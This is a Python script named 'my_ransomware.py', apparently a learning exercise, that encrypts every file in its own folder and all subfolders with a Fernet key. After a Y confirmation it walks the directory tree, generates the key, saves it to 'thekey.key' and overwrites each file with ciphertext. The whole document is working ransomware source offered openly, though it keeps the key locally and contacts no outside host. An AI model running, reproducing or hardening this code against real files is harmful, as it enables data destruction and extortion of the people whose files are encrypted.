import os
import sys
from cryptography.fernet import Fernet

#giving a choice whether user wants to run program or not
print("This program is dangerous. It will encrypt all files in the current 'my_ransomware.py' \
is housed in as well as all files in the sub directories")
user_choice = input("Are you absolutely sure you want to continue?(Y/n) ")
if user_choice != "Y":
    print("Confirmed that you DO NOT want to encrypt files. Exiting...")
    sys.exit()

"""This chunk of the code finds all files in current folder and all 
subfolders (excluding "decrypt.py", "my_ransomware.py", and "thekey.key")
and appends them to a list for later use"""
dir_path = os.path.dirname(os.path.realpath(__file__))
files = []
for dirpath,_,filenames in os.walk(dir_path):
    for f in filenames:
        if os.path.basename(f) == "decrypt.py" or os.path.basename(f) == "my_ransomware.py" or os.path.basename(f) == "thekey.key":
            continue
        verbose_file_path = os.path.abspath(os.path.join(dirpath, f))
        files.append(verbose_file_path)
        
#prints list of all saved files with their directory path
print(files)

#Fernet generates an aes 128-bit key for encryption and decryption
key = Fernet.generate_key()

#prints the generated encrypt/decrypt key to the terminal
print(key)

#writes generated key to terminal, so is visible
with open("thekey.key", "wb") as thekey:
    thekey.write(key)


#reads cleartext files, encrypts with the Fernet generated key, then writes the encrypted data back to the files
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)